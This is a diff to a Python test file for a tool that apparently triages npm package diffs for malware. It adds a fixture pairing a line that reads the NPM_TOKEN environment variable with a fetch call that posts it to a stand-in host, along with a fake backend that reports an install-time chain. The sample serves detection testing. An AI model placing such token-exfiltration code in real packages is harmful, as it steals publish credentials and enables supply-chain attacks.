@@ -13,9 +13,12 @@ from npmdiffwatch.config import Config
 from npmdiffwatch.models import Diff, FileDiff, Hunk, TriageResult
 
 
+_SRC, _SINK = "const t = process.env.NPM_TOKEN;", "fetch('https://c.example.invalid', { body: t });"
+
+
 def _diff():
     return Diff(package="p", version="1.0.0", is_first_release=False,
-                changed=[FileDiff("index.js", "modified", [Hunk((0, 1), (0, 1), ["x()"], [])])],
+                changed=[FileDiff("index.js", "modified", [Hunk((0, 1), (0, 2), [_SRC, _SINK], [])])],
                 added_binaries=[])
 
 
@@ -30,7 +33,8 @@ class _FakeBackend:
 
     def __init__(self, payload):
         # A complete, install-time chain, so the chain gate lets a malicious verdict stand.
-        self._payload = {"runs_when": "install", "chain_source": "a.js:1", "chain_sink": "a.js:2", **payload}
+        self._payload = {"runs_when": "install", "chain_source": "index.js:1", "chain_sink": "index.js:2",
+                         "chain_source_code": _SRC, "chain_sink_code": _SINK, **payload}
 
     def complete(self, **kw):
         return json.dumps(self._payload)
